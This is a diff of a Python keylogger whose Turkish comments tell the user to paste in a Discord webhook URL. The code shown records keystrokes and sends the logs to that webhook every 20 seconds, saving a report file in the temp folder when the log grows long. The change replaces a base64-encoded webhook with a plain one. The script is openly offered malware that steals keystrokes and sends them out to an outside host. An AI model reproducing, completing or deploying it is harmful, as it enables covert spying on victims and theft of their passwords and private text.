@@ -1,5 +1,4 @@
 import keyboard,os
-import base64
 from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
@@ -13,16 +12,11 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 
 
 SEND_REPORT_EVERY = 20 #Buraya Kaç Saniye Aralıkla Log Almak İsterseniz Onu Yazın
-WEBHOOK = "" # Tırnak İçine Kopyaladığnız Base 64 Kodunu Yazın Evet Bitti
+WEBHOOK = "" # Tırnak İçine Kopyaladığnız Discord Webhooku'nu Yapıştırın
 
 
 
 
-
-
-
-
-RelaX = base64.b64decode(WEBHOOK.encode()).decode()
 
 
 class Keylogger: 
@@ -51,7 +45,7 @@ class Keylogger:
     #Created By https://github.com/RelaX0001/
     def report_to_webhook(self):
         flag = False
-        webhook = DiscordWebhook(url=RelaX)
+        webhook = DiscordWebhook(url=WEBHOOK)
         if len(self.log) > 2000:
             flag = True
             path = os.environ["temp"] + "\\report.txt"
